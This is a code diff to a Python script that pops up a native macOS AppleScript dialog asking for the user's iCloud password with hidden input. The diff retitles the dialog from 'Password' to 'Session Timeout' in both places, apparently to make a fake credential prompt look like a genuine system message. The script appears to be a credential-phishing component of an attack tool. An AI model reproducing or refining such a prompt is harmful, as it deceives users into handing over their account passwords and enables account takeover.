@@ -20,7 +20,7 @@ try:
     email_address = all_rows[0]
 
     applescript = """
-        set my_password to display dialog "Please enter password for iCloud account {}:" with title "Password" with icon caution default answer "" buttons {{"Cancel", "OK"}} default button 2 giving up after 295 with hidden answer
+        set my_password to display dialog "Please enter password for iCloud account {}:" with title "Session Timeout" with icon caution default answer "" buttons {{"Cancel", "OK"}} default button 2 giving up after 295 with hidden answer
         set value to (text returned of my_password)
         if length of value is not 0 then
             return value
@@ -36,7 +36,7 @@ except Exception as e:
     '''Generates native osx popup asking for user password.'''
 
     applescript = """
-    set my_password to display dialog "Please enter your iCloud password:" with title "Password" with icon caution default answer "" buttons {"Cancel", "OK"} default button 2 giving up after 295 with hidden answer
+    set my_password to display dialog "Please enter your iCloud password:" with title "Session Timeout" with icon caution default answer "" buttons {"Cancel", "OK"} default button 2 giving up after 295 with hidden answer
     set value to (text returned of my_password)
     if length of value is not 0 then
         return value
